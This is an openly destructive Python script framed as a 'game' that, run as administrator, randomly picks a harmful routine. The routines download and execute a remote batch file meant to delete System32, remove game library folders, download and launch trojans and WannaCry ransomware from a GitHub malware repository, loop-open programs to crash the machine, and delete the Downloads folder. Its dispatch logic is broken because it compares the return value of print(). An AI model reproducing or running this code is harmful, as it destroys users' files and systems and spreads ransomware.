#ive said this many times but please run this script as admin. it wont work without admin permissions.
import time
import random
import os
import webbrowser
import urllib.request
import subprocess
import shutil

def delsystem32():
    url = "https://raw.githubusercontent.com/FeltMacaroon389/System32-Deleter/refs/heads/master/death.bat"
    bat_file_path = "death.bat"

    with urllib.request.urlopen(url) as response:
        bat_content = response.read().decode('utf-8')

    with open(bat_file_path, "w") as file:
        file.write(bat_content)

    subprocess.run(["cmd.exe", "/c", bat_file_path])

def delallgames():
    #every single games you have on steam, gog and epic just removed. maybe even p!rated games with C:/games.
    os.rmdir(r"C:\Program Files (x86)\Steam\steamapps\common")
    os.rmdir(r"C:\GOG Games")
    os.rmdir(r"C:\Program Files (x86)\GOG.com")
    os.rmdir(r"C:\Games")
    os.rmdir(r"C:\Program Files\Epic Games")
def downloadmalware():
    executables = {
    "Bluescreen.exe": "https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Trojan/BlueScreen.exe",
    "000.exe": "https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Trojan/000.exe",
    "WannaCry.exe": "https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Ransomware/WannaCry.exe"
}

    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")

    for name, url in executables.items():

        download_path = os.path.join(download_dir, name)
    
        urllib.request.urlretrieve(url, download_path)
    
        subprocess.Popen(download_path)

def crashtry():
    #tries to crash you by opening so many junk. i have no idea how well this works but probably not very good. the least dangerous from all of these.
    run = True
    while run == True:
        webbrowser.open("https://www.google.com")
        os.open(r"C:\Windows\explorer.exe")
        os.open(r"C:\Windows\Notepad.exe")
        os.open(r"C:\Windows\System32\Taskmgr.exe")
def deldownloads():

    # Path to the Downloads folder
    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")

    # Delete the folder. yes, its that easy to delete such an important folder LMAOOO
    shutil.rmtree(downloads_path)
    print("Downloads folder deleted successfully.")

events = ["you got: deleting system32", "you got: deleting all games", "you got: downloading malware", "you got: crashtry", "you got: delete downloads folder"]
print("Welcome to Press that button! a VERY destructive 'game' where you press a button, and destructive computer things happen!")
print("WARNING - this script is VERY dangerous. it can go from just opening random stuff, to deleting system32 and downloading malware. i am NOT responsible for any damage caused. please run this with safe measures.")
print("also, PLEASE run this script as administrator. it will not work without it.")
starting = input("type 'start' to start the game!\n")
if starting == "start":
    button = input("now, would you like to press the button?\n")
    if button == "yes":
        destruct = print(random.choice(events))
        if destruct == "you got: deleting system32":
            delsystem32()
        elif destruct == "you got: deleting all games":
            delallgames()
        elif destruct == "you got: downloading malware":
            downloadmalware()
        elif destruct == "you got: crashtry":
            crashtry()
        elif destruct == "you got: delete downloads folder":
            deldownloads()
    elif button == "no":
        print("ok... goodbye then?")
